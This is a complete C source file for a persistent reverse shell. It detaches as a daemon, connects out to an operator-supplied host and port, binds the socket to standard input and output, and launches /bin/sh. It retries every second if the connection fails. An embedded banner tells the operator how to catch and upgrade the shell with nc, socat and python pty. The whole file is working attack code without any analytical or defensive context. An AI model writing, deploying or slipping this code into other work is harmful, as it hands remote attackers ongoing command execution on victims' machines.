#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define LEN 0x400

void usage();
void reverse_shell(const char* host, unsigned short port);
const char shell[] = "/bin/sh";
const char message[] = "Successfully reversed!\nIf you want a readline function, please use nc in this way:\n\trlwrap nc -lvvp <port>\nor:\n\tsocat readline,history=/tmp/.socat exec:'nc -lvvp <port>'\n\nIf you want to use a bash, please run the command after reversed:\n\tpython -c \"import pty;pty.spawn('/bin/bash')\"\n";
const char* prompt = message + 23;
char g_bin[LEN];

int main(int argc, char *argv[]) {
    memset(g_bin, 0, LEN);
    strncpy(g_bin, argv[0], LEN - 1);

    if(argc != 3) {
        usage();
    }

    int ret = daemon(1, 1);
    if (ret < 0) {
        fprintf(stderr, "Cannot enter daemon mode!\n");
        exit(ret);
    }
    const char* host = argv[1];
    unsigned short port = (unsigned short)strtol(argv[2], NULL, 10);

    while (1) {
        pid_t pid = fork();
        if (pid < 0) {
            fprintf(stderr, "Cannot fork!\n");
            exit(EXIT_FAILURE);
        } else if (pid > 0) {
            // parent process
            int status;
            waitpid(pid, &status, 0);
        } else {
            // child process
            reverse_shell(host, port);
            exit(EXIT_FAILURE);   // exec never returns
        }
        sleep(1);
    }
    return 0;
}

void reverse_shell(const char* host, unsigned short port) {
    int sock;
    struct sockaddr_in server;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0) {
        fprintf(stderr, "Cannot make socket!");
        exit(sock);
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(host);

    int ret = connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr));
    if(ret < 0) {
        fprintf(stderr, "Cannot connect to %s:%d!\n", host, port);
        exit(ret);
    }

    send(sock, message, sizeof(message), 0);
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execl(shell, shell, NULL);
    close(sock);
}

void usage() {
    fprintf(stdout, "Usage: %s <reverse_host> <port>\n\n", g_bin);
    fprintf(stdout, prompt);
    exit(-1);
}
